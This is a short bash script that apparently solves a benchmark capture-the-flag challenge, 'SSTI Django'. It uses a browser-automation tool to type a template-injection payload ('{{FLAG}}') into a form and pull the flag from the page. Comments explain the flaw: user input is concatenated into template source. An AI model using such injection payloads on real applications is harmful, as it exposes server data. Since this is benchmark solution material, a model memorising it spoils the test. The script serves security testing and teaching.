#!/usr/bin/env bash
# XBEN-009-24 — "SSTI Django" (tags: ssti)
#
# The view concatenates the `name` parameter into the *template source* and then
# renders it with a context that holds the flag. Anything in the name is
# template code, so `{{FLAG}}` prints the variable the view put there.
#
# Nothing is replayed here: the whole attack fits in the form, which is worth
# showing. The workbench is for the requests a page will not make for you, and
# this page makes exactly the one that is needed.
#
# Note the host: Django's ALLOWED_HOSTS admits `localhost` and not `127.0.0.1`,
# so the same address under the wrong name answers 400.
set -uo pipefail
URL="${1:?usage: $0 http://localhost:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben009-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" browser type --selector "#name" "{{FLAG}}" --session "$SESSION" >/dev/null
"$H5I" browser click --role button --name "Greet" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
